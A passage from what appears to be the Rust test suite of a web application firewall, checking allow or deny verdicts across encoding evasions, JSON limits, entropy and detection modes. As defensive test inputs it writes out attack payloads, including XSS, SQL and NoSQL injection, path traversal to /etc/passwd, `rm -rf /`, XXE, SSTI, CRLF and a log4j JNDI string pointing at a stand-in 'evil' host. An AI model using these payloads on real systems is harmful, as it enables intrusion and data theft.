            Some("application/json"),
            body,
            &aggressive_profile(),
        );
        assert!(
            matches!(result, WafVerdict::Deny(_)),
            "expected Deny, got {result:?}"
        );
    }

    #[test]
    fn balanced_allows_quadruple_url_encoded_xss() {
        // Same body, balanced mode: `alert(` is no longer a balanced
        // pattern, and 4-level encoding outruns the 3-pass decode loop —
        // so `<script` is never exposed. Expected outcome: Allow.
        let body = br#"{"html":"%2525253Cscript%2525253Ealert(1)"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_denies_triple_url_encoded_xss_via_script_tag() {
        // Triple-encoded `<script` decodes within the 3-pass decode loop
        // and matches the balanced pattern `<script`. Pins the decode-loop
        // recursion still works when targeting a high-precision pattern.
        // %25253c → %253c → %3c → <
        let body = br#"{"html":"%25253cscript src=evil>"}"#;
        assert!(matches!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny(_)
        ));
    }

    // ── URI scanning ──

    #[test]
    fn uri_denies_sqli_in_query() {
        // "' or 1=1" is in the pattern list
        assert_eq!(
            validate_uri("/api/users?id=' or 1=1", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_allows_safe_path() {
        assert_eq!(
            validate_uri("/api/v1/users?page=2&sort=name", WafMode::Balanced),
            WafVerdict::Allow
        );
    }

    #[test]
    fn uri_denies_encoded_traversal() {
        // "../../../" is the pattern — 3 levels of traversal
        assert_eq!(
            validate_uri("/api/files?path=../../../etc/passwd", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_denies_encoded_traversal_pct() {
        // %2e%2e%2f is literally in the pattern list, so matches on raw scan
        assert_eq!(
            validate_uri(
                "/api/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log",
                WafMode::Balanced
            ),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_denies_double_encoded_traversal() {
        // %252e%252e%252f → %2e%2e%2f → ../ (matches after recursive decode)
        assert_eq!(
            validate_uri(
                "/api/files?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log",
                WafMode::Balanced,
            ),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn allows_safe_payload() {
        let body = br#"{"username":"john_doe","email":"john@example.com","age":30}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Gate 5: JSON structural ──

    #[test]
    fn denies_malformed_json() {
        let body = br#"{"broken: true"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("malformed JSON")
        );
    }

    #[test]
    fn denies_deep_nesting() {
        let body = br#"{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":1}}}}}}}}}}}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn relaxed_allows_deep_nesting() {
        let body = br#"{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":1}}}}}}}}}}}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &relaxed_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_at_exact_max_depth() {
        let mut json = String::from("1");
        for _ in 0..10 {
            json = format!(r#"{{"a":{json}}}"#);
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    #[test]
    fn denies_one_past_max_depth() {
        let mut json = String::from("1");
        for _ in 0..11 {
            json = format!(r#"{{"a":{json}}}"#);
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_long_string_value() {
        let long = "x".repeat(1_048_577);
        let body = format!(r#"{{"key":"{long}"}}"#);
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_long_key_name() {
        let long_key = "k".repeat(1_048_577);
        let body = format!(r#"{{"{long_key}":"value"}}"#);
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_deeply_nested_array() {
        let mut json = String::from("1");
        for _ in 0..12 {
            json = format!("[{json}]");
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn allows_json_with_all_value_types() {
        let body = br#"{"str":"v","num":42,"float":3.14,"bool":true,"null":null,"arr":[1],"obj":{"k":"v"}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_array_within_depth() {
        let body = br#"{"items":[1,2,3]}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Method filtering ──

    #[test]
    fn allows_get_without_body() {
        assert_eq!(
            validate_request("GET", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_delete_without_body() {
        assert_eq!(
            validate_request("DELETE", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_head_without_body() {
        assert_eq!(
            validate_request("HEAD", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_options_without_body() {
        assert_eq!(
            validate_request("OPTIONS", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_post_empty_body() {
        assert_eq!(
            validate_request("POST", Some("application/json"), &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn put_validates_body() {
        let body = br#"{"broken: true"#;
        assert_eq!(
            validate_request("PUT", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("malformed JSON")
        );
    }

    #[test]
    fn patch_validates_body() {
        let body = br#"{"valid": true}"#;
        assert_eq!(
            validate_request("PATCH", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Entropy ──

    #[test]
    fn allows_normal_entropy() {
        let body = br#"{"name":"John Doe","email":"john@example.com","message":"Hello, this is a normal message with typical text content."}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Shannon entropy unit test ──

    #[test]
    fn entropy_constant_is_zero() {
        let data = vec![b'A'; 100];
        assert!(shannon_entropy(&data) < 0.01);
    }

    #[test]
    fn entropy_random_is_high() {
        // Simulated high entropy (all 256 byte values)
        let data: Vec<u8> = (0..=255).cycle().take(512).collect();
        assert!(shannon_entropy(&data) > 7.5);
    }

    #[test]
    fn entropy_normal_text_is_moderate() {
        let data =
            b"This is a normal English text with reasonable entropy levels for testing purposes.";
        let e = shannon_entropy(data);
        assert!(e > 3.0 && e < 5.5, "entropy was {e}");
    }

    // ── Plus-to-space evasion ──

    #[test]
    fn url_decode_converts_plus_to_space() {
        assert_eq!(
            url_decode(std::borrow::Cow::Borrowed(b"union+select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn denies_plus_encoded_sqli_in_body() {
        // "union+select" → "union select" after + normalization
        let body = br#"{"query":"union+select+*+from+users"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn uri_denies_plus_encoded_sqli() {
        assert_eq!(
            validate_uri("/api/search?q='+or+1=1", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn url_decode_handles_mixed_encoding() {
        // %27 = ' and + = space
        assert_eq!(
            url_decode(std::borrow::Cow::Borrowed(b"admin%27+OR+%271%27=%271")).as_ref(),
            b"admin' or '1'='1"
        );
    }

    // ── SQL comment evasion ──

    #[test]
    fn strip_sql_comments_basic() {
        assert_eq!(
            strip_sql_comments(std::borrow::Cow::Borrowed(b"union/**/select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn strip_sql_comments_nested_content() {
        assert_eq!(
            strip_sql_comments(std::borrow::Cow::Borrowed(b"union/*hack*/select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn denies_sql_comment_evasion_in_body() {
        let body = br#"{"q":"union/**/select * from users"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn uri_denies_sql_comment_evasion() {
        assert_eq!(
            validate_uri("/search?q=union/**/select", WafMode::Balanced),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    // ── JSON unicode escape evasion ──

    #[test]
    fn normalize_json_unicode_basic() {
        // \u0027 = '  (single quote)
        assert_eq!(
            normalize_json_unicode(std::borrow::Cow::Borrowed(b"\\u0027")).as_ref(),
            b"'"
        );
    }

    #[test]
    fn normalize_json_unicode_angle_bracket() {
        // \u003c = <
        assert_eq!(
            normalize_json_unicode(std::borrow::Cow::Borrowed(b"\\u003cscript")).as_ref(),
            b"<script"
        );
    }

    #[test]
    fn denies_json_unicode_xss_in_body() {
        // \\u003c in raw bytes = literal \u003c after normalization
        // Use <script only (no alert) so raw scan doesn't match the literal
        let body = br#"{"html":"\\u003cscript src=x>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    // ── New categories (v0.1.4) ──

    #[test]
    fn aggressive_denies_xss_event_handler_oninput() {
        // `oninput=` is aggressive-only (low-anchor handler, FP-prone in
        // any code-bearing payload). Test pinned under aggressive mode.
        let body = br#"{"html":"<div oninput=alert(1)>"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss_img_tag() {
        let body = br#"{"html":"<img src=x onerror=alert(1)>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss_srcdoc() {
        let body = br#"{"html":"<iframe srcdoc=<script>alert(1)</script>>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_xss_innerhtml() {
        // `innerhtml` is aggressive-only (high FP in dev tooling, MDN-style
        // doc snippets, code-paste APIs).
        let body = br#"{"code":"element.innerHTML = userInput"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_nosql_injection_gt() {
        // `$gt` (no anchor) is aggressive-only — matches anywhere, including
        // legit strings like `"$gt-23"`. Aggressive mode pins the catch.
        let body = br#"{"username":{"$gt":""},"password":{"$gt":""}}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_nosql_injection_where() {
        let body = br#"{"$where":"this.password == 'admin'"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_nosql_injection_regex() {
        let body = br#"{"username":{"$regex":".*"}}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_java_deserialization() {
        // Java RCE class-name patterns are aggressive-only because they
        // also appear verbatim in any JVM stack trace forwarded by APMs.
        let body = br#"{"cmd":"Runtime.getRuntime().exec('id')"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_python_deserialization() {
        let body = br#"{"data":"pickle.loads(base64.b64decode(payload))"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_python_os_system() {
        let body = br#"{"cmd":"os.system('rm -rf /')"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_php_deserialization() {
        let body = br#"{"data":"unserialize($_GET['data'])"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_php_filter_wrapper() {
        let body = br#"{"file":"php://filter/convert.base64-encode/resource=config.php"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_graphql_introspection_with_whitespace() {
        // `{__schema` (no space) is in BALANCED — see
        // `denies_graphql_type_probe` which exercises that. With realistic
        // GraphQL formatting (`{ __schema`), the lone `__schema` token is
        // what fires, and that lives in AGGRESSIVE.
        let body = br#"{"query":"{ __schema { types { name } } }"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_graphql_type_probe() {
        let body = br#"{"query":"{__type(name:\"User\"){fields{name}}}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn allows_legitimate_json_with_dollar() {
        // Legitimate JSON with $ in values (MongoDB query syntax in app code is fine)
        let body = br#"{"price":42.99,"currency":"$USD","note":"item costs $5"}"#;
        // $USD and $5 should NOT match $gt/$ne/$regex (those require exact prefix)
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_legitimate_graphql_query() {
        // Normal GraphQL query without introspection
        let body = br#"{"query":"{ users(limit: 10) { id name email } }"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── LDAP / XXE / SSTI / CRLF (v0.1.4b) ──

    #[test]
    fn denies_ldap_injection() {
        let body = br#"{"filter":")(cn=*))"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xxe_entity() {
        let body = br#"{"xml":"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssti_jinja() {
        let body = br#"{"name":"{{7*7}}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssti_java() {
        let body = b"{\"expr\":\"#{t(java.lang.Runtime).getRuntime()}\"}";
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_crlf_injection() {
        let body = br#"{"header":"value%0d%0aSet-Cookie: admin=true"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xxe_system_file() {
        let body = br#"{"dtd":"SYSTEM \"file:///etc/shadow\""}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xsl_injection() {
        let body = br#"{"xml":"<xsl:stylesheet version=\"1.0\">"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    // ══════════════════════════════════════════════════════════════════
    // NEW CONTRACT (v0.1.7+):
    //   * `Balanced` (default) MUST NOT block legitimate developer / dev
    //     tooling / educational content carrying tokens that the previous
    //     "all-patterns" WAF flagged as attacks (alert(, eval(, $gt, …).
    //   * `Aggressive` keeps the broad coverage for routes that opt in.
    //   * Entropy default 6.5 bits/byte — base64 / JWT must pass; only
    //     near-random / encrypted payloads are flagged.
    //   * `entropy_check = false` is a kill switch.
    // ══════════════════════════════════════════════════════════════════

    #[test]
    fn balanced_allows_legitimate_alert_in_text() {
        // Customer-support comment quoting "alert(" as a literal — the
        // single most common false-positive class with the old WAF.
        let body = br#"{"comment":"the user clicked alert(true) in the broken page"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_allows_eval_and_documentcookie_in_docs() {
        // MDN-style snippet posted to a docs API — would have been blocked
        // by `eval(` and `document.cookie`, both now aggressive-only.
        let body =
            br#"{"snippet":"never trust eval(input) and never read document.cookie directly"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_allows_dollar_prefixed_id() {
        // `$gt-23` would have matched the unanchored `$gt` mongo pattern.
        // Aggressive still blocks; balanced lets through.
        let body = br#"{"id":"$gt-23","tag":"$ne-marker"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn aggressive_still_blocks_dollar_gt() {
        // Inverse of above — confirms aggressive mode keeps detection.
        let body = br#"{"username":{"$gt":""}}"#;
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny(_)
        ));
    }

    #[test]
    fn balanced_allows_java_stack_trace_payload() {
        // Stack-trace forwarder POSTs Java class names (Runtime.getRuntime,
        // ProcessBuilder, ObjectInputStream). Used to be blocked; now must
        // pass under balanced.
        let body = br#"{"trace":"java.lang.Runtime.getRuntime called from ProcessBuilder via ObjectInputStream"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_keeps_high_signal_xss_blocking() {
        // Regression guard: balanced mode must STILL block tag-anchored
        // XSS (`<script`), `onerror=` event handler, `javascript:` sink,
        // and CVE-class patterns like `${jndi:`. These are the SOC-grade
        // detections we promise.
        let cases: &[&[u8]] = &[
            br#"{"x":"<script>x</script>"}"#,
            br#"{"x":"<img src=x onerror=foo>"}"#,
            br#"{"x":"javascript:foo()"}"#,
            br#"{"x":"${jndi:ldap://evil/a}"}"#,
            br#"{"x":"' or '1'='1"}"#,
            br#"{"x":"../../../etc/passwd"}"#,
        ];
        for body in cases {
            assert!(
                matches!(
                    validate_request("POST", Some("application/json"), body, &strict_profile()),
                    WafVerdict::Deny(_)
                ),
                "balanced mode must still block: {}",
                std::str::from_utf8(body).unwrap()
            );
        }
    }

    // ── Entropy: new default 6.5 with toggle ──

    /// Build a body of the form `{"k":"<payload>"}` that reaches the
    /// entropy gate (≥256 body bytes, ≥128 string-content bytes).
    fn json_with_string_value(value_bytes: &[u8]) -> Vec<u8> {
        let mut v = Vec::with_capacity(value_bytes.len() + 12);
        v.extend_from_slice(br#"{"k":""#);
        v.extend_from_slice(value_bytes);
        v.extend_from_slice(br#""}"#);
        v
    }

    /// Pseudo-random bytes from a tiny LCG. Self-contained — no rand crate.
    /// Output entropy is close to 8 bits/byte over a 1KB window, so this
    /// reliably exceeds the 6.5 default threshold.
    fn pseudo_random(len: usize, seed: u64) -> Vec<u8> {
        let mut out = Vec::with_capacity(len);
        let mut state = seed.wrapping_add(0x9E3779B97F4A7C15);
        for _ in 0..len {
            state = state
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            out.push((state >> 56) as u8);
        }
        out
    }

    #[test]
    fn balanced_allows_base64_payload_in_json() {
        // Pure-base64 alphabet maxes at 6.0 bits/byte. The old default
        // (5.5) would have blocked any sufficiently long base64. New
        // default 6.5 leaves headroom — so JWTs / signed URLs / image
        // uploads as base64 pass.
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = Vec::with_capacity(512);
        for i in 0..512 {
            payload.push(alphabet[i % alphabet.len()]);
        }
        let body = json_with_string_value(&payload);
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &strict_profile()),
            WafVerdict::Allow,
            "balanced threshold (6.5) must let base64 through"
        );
    }

    /// Profile that explicitly allows `application/octet-stream` so we
    /// can exercise the entropy gate on raw binary bodies without the
    /// JSON gate (or the unknown-content-type short-circuit) firing.
    fn binary_profile() -> WafProfile {
        WafProfile {
            allowed_content_types: vec!["application/octet-stream".to_string()],
            // Inherit balanced defaults (mode, threshold 6.5, gate on).
            ..WafProfile::default()
        }
    }

    #[test]
    fn balanced_blocks_random_payload_octet_stream() {
        // Test the entropy gate in isolation: octet-stream skips the JSON
        // gate, and `binary_profile` allows the content-type so we don't
        // short-circuit on Gate 2.
        let body = pseudo_random(1024, 0xDEAD_BEEF);
        let v = validate_request(
            "POST",
            Some("application/octet-stream"),
            &body,
            &binary_profile(),
        );
        assert_eq!(
            v,
            WafVerdict::Deny("suspicious payload entropy"),
            "balanced 6.5 threshold must flag near-random payloads, got {v:?}"
        );
    }

    #[test]
    fn entropy_check_disabled_lets_random_through() {
        // Kill switch: `entropy_check = false` skips Gate 4 entirely.
        // Same body that the previous test blocks must now pass.
        let body = pseudo_random(1024, 0xCAFEF00D);
        let mut p = binary_profile();
        p.entropy_check = false;
        assert_eq!(
            validate_request("POST", Some("application/octet-stream"), &body, &p),
            WafVerdict::Allow,
            "entropy_check=false must short-circuit the gate"
        );
    }

    #[test]
    fn entropy_threshold_is_configurable() {
        // Lower the threshold to the legacy 5.5; base64 again gets denied.
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = Vec::with_capacity(512);
        for i in 0..512 {
            payload.push(alphabet[i % alphabet.len()]);
        }
        let body = json_with_string_value(&payload);
        let mut p = strict_profile();
        p.entropy_threshold = 5.5;
        assert!(matches!(
            validate_request("POST", Some("application/json"), &body, &p),
            WafVerdict::Deny(_)
        ));
    }

    #[test]
    fn entropy_skips_low_string_content_json() {
        // Numeric-heavy JSON has very few string bytes; the JSON-string
        // entropy path returns None and the gate skips. Body is ≥256
        // bytes so the size precondition is met.
        let mut body = Vec::from(&b"{\"data\":["[..]);
        for i in 0..50 {
            if i > 0 {
                body.push(b',');
            }
            body.extend_from_slice(format!("{i}").as_bytes());
        }
        body.extend_from_slice(b"]}");
        // Pad to >= 256 bytes with zero-entropy structural junk OUTSIDE
        // strings, so the byte count is right but string content stays low.
        while body.len() < 300 {
            body.extend_from_slice(b"          ");
        }
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn json_string_entropy_function_distinguishes_payloads() {
        // Direct unit test of the new helper, independent of validate_request.
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = Vec::with_capacity(512);
        for i in 0..512 {
            payload.push(alphabet[i % alphabet.len()]);
        }
        let base64_body = json_with_string_value(&payload);
        let e_b64 = shannon_entropy_json_strings(&base64_body, 128).unwrap();
        assert!(
            e_b64 < 6.5,
            "base64 entropy should be below 6.5 (got {e_b64})"
        );

        let random = pseudo_random(1024, 0x1234_5678);
        let random: Vec<u8> = random
            .into_iter()
            .map(|b| if b == b'"' || b == b'\\' { b'A' } else { b })
            .collect();
        let rand_body = json_with_string_value(&random);
        let e_rand = shannon_entropy_json_strings(&rand_body, 128).unwrap();
        assert!(
            e_rand > 7.0,
            "random-byte entropy should be above 7.0 (got {e_rand})"
        );
    }

    #[test]
    fn json_string_entropy_returns_none_when_undersample() {
        // Tiny string content under min_sample → None.
        let body = br#"{"k":"hi","n":42}"#;
        assert!(shannon_entropy_json_strings(body, 128).is_none());
    }
}
